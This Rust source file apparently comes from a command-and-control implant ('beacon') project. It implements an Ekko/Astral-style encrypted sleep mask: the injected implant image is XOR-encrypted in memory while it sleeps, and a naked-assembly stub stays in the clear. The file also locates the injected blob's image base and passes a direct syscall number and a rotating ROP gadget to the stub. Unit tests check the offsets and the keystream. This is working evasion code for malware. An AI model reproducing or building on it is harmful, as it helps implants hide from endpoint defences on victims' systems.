//! Encrypted sleep mask: discovery primitives and the parameter block
//! (port of the Ekko/Astral sleep-mask paths of the original project).
//!
//! While the beacon sleeps it is fully encrypted in memory except for the
//! self-contained sleep stub — the same property the original's NASM
//! sleepmask provides. Everything discoverable lives here and is
//! host-tested against mock images: the image bounds (entry prologue and
//! end marker), and the stub's own end marker. The stub itself is naked
//! assembly in the beacon crate.
//!
//! Keystream (documenting the asm, byte-oriented xorshift64, 1 byte per
//! step, fully reversible with the same seed):
//!
//! ```text
//! state = seed
//! per byte: state ^= state << 13; state ^= state >> 7;
//!           state ^= state << 17; out = state as u8; state >>= 8
//! ```
//!
//! Kept in sync with the asm in crates/beacon/src/runtime/sleepmask.rs by
//! construction — both directions of the mask run the identical stream.

/// End-of-image marker bytes (same magic pe_blob.py verifies on the blob).
pub const IMAGE_END_MAGIC: [u8; 8] = [0xEF, 0xBE, 0xAD, 0xDE, 0, 0, 0, 0];

/// End-of-stub marker bytes emitted as data inside the sleep stub; the mask
/// keeps the whole [stub_start, stub_end) window unencrypted.
pub const STUB_END_MAGIC: [u8; 8] = [0xBE, 0xBA, 0xFE, 0xCA, 0, 0, 0, 0];

/// The SptEntry prologue at image offset 0 (as verified by pe_blob.py).
pub const ENTRY_PROLOGUE: [u8; 5] = [0x48, 0x83, 0xEC, 0x08, 0xE8];

/// Parameter block handed to the sleep stub. Pinned by tests: the naked asm
/// loads every field by fixed offset.
#[repr(C)]
pub struct SleepMaskParams {
    pub img_base: usize,   // +0x00
    pub img_end: usize,    // +0x08
    pub stub_start: usize, // +0x10
    pub stub_end: usize,   // +0x18
    pub seed: u64,         // +0x20
    pub ssn: u32,          // +0x28 (NtDelayExecution)
    pub _pad: u32,         // +0x2C
    pub gadget: usize,     // +0x30 (rotated per cycle)
    pub interval: i64,     // +0x38 (relative delay)
}

/// Walk down from a hint address in fixed steps, returning the first
/// candidate whose first bytes are the entry prologue — the image base of a
/// page-aligned injected blob. Bounded by `max_steps` candidates so the
/// walk never runs into unmapped memory.
///
/// # Safety
///
/// The hint must point inside a mapped region large enough for the walk
/// downwards (the beacon passes the stub's own address, inside the image).
pub unsafe fn find_image_base(hint: usize, step: usize, max_steps: usize) -> Option<usize> {
    let mut candidate = hint & !(step - 1);
    for _ in 0..max_steps {
        let bytes = core::slice::from_raw_parts(candidate as *const u8, ENTRY_PROLOGUE.len());
        let mut eq = true;
        let mut i = 0;
        while i < ENTRY_PROLOGUE.len() {
            if bytes[i] != ENTRY_PROLOGUE[i] {
                eq = false;
            }
            i += 1;
        }
        if eq {
            return Some(candidate);
        }
        if candidate < step {
            return None;
        }
        candidate -= step;
    }
    None
}

/// Bounded scan for the end-of-image marker from an address: returns the
/// marker's address (the image ends marker+len bytes later).
///
/// # Safety
///
/// `from` must be mapped for `bound` bytes.
pub unsafe fn find_marker(from: usize, bound: usize, magic: &[u8; 8]) -> Option<usize> {
    if bound < 8 {
        return None;
    }
    let bytes = core::slice::from_raw_parts(from as *const u8, bound);
    let mut i = 0;
    while i + 8 <= bound {
        if &bytes[i..i + 8] == magic {
            return Some(from + i);
        }
        i += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::prelude::v1::*;

    #[test]
    fn params_offsets_are_pinned() {
        use core::mem::offset_of;
        assert_eq!(offset_of!(SleepMaskParams, img_base), 0x00);
        assert_eq!(offset_of!(SleepMaskParams, img_end), 0x08);
        assert_eq!(offset_of!(SleepMaskParams, stub_start), 0x10);
        assert_eq!(offset_of!(SleepMaskParams, stub_end), 0x18);
        assert_eq!(offset_of!(SleepMaskParams, seed), 0x20);
        assert_eq!(offset_of!(SleepMaskParams, ssn), 0x28);
        assert_eq!(offset_of!(SleepMaskParams, gadget), 0x30);
        assert_eq!(offset_of!(SleepMaskParams, interval), 0x38);
        assert_eq!(core::mem::size_of::<SleepMaskParams>(), 0x40);
    }

    #[test]
    fn image_base_is_found_walking_down() {
        // Image placed page-aligned inside a larger buffer (Vec allocations
        // are not page-aligned: compute the first aligned slot dynamically).
        let buf = Box::leak(vec![0u8; 0x8000].into_boxed_slice());
        let base = ((buf.as_ptr() as usize + 0x1000) & !0xFFF) + 0x1000;
        let start = base - buf.as_ptr() as usize;
        buf[start..start + 5].copy_from_slice(&ENTRY_PROLOGUE);
        let hint = base + 0x800; // somewhere inside the image
        let found = unsafe { find_image_base(hint, 0x1000, 8) };
        assert_eq!(found, Some(base));
    }

    #[test]
    fn image_base_walk_is_bounded() {
        // A buffer with no prologue: bounded walk must give up, not crash.
        let buf = Box::leak(vec![0x11u8; 0x2000].into_boxed_slice());
        let hint = buf.as_ptr() as usize + 0x1800;
        let found = unsafe { find_image_base(hint, 0x1000, 2) };
        assert_eq!(found, None);
    }

    #[test]
    fn end_and_stub_markers_are_found() {
        let mut buf = [0u8; 0x1000];
        buf[0x40..0x48].copy_from_slice(&STUB_END_MAGIC);
        let end_off = 0x1000 - 8;
        buf[end_off..].copy_from_slice(&IMAGE_END_MAGIC);
        let base = buf.as_ptr() as usize;
        let stub_end = unsafe { find_marker(base + 0x10, 0x400, &STUB_END_MAGIC) };
        assert_eq!(stub_end, Some(base + 0x40));
        let img_end = unsafe { find_marker(base, 0x1000, &IMAGE_END_MAGIC) };
        assert_eq!(img_end, Some(base + end_off));
        // Distinct magics: the image-end search must not stop on the stub
        // magic, and a bound shorter than the magic finds nothing.
        assert_eq!(unsafe { find_marker(base, 0x1000, &[0xAAu8; 8]) }, None);
        assert_eq!(unsafe { find_marker(base, 4, &IMAGE_END_MAGIC) }, None);
    }

    #[test]
    fn keystream_is_self_inverse() {
        // The Rust twin of the asm stream: encryption and decryption use the
        // same transform — same seed, same bytes in, same bytes out.
        fn stream_next(state: &mut u64) -> u8 {
            *state ^= *state << 13;
            *state ^= *state >> 7;
            *state ^= *state << 17;
            let b = *state as u8;
            *state >>= 8;
            b
        }
        let mut data = [0x5Au8; 64];
        let orig = data;
        let mut s = 0x0123_4567_89AB_CDEFu64;
        for b in data.iter_mut() {
            *b ^= stream_next(&mut s);
        }
        assert_ne!(data, orig);
        let mut s = 0x0123_4567_89AB_CDEFu64;
        for b in data.iter_mut() {
            *b ^= stream_next(&mut s);
        }
        assert_eq!(data, orig);
    }
}
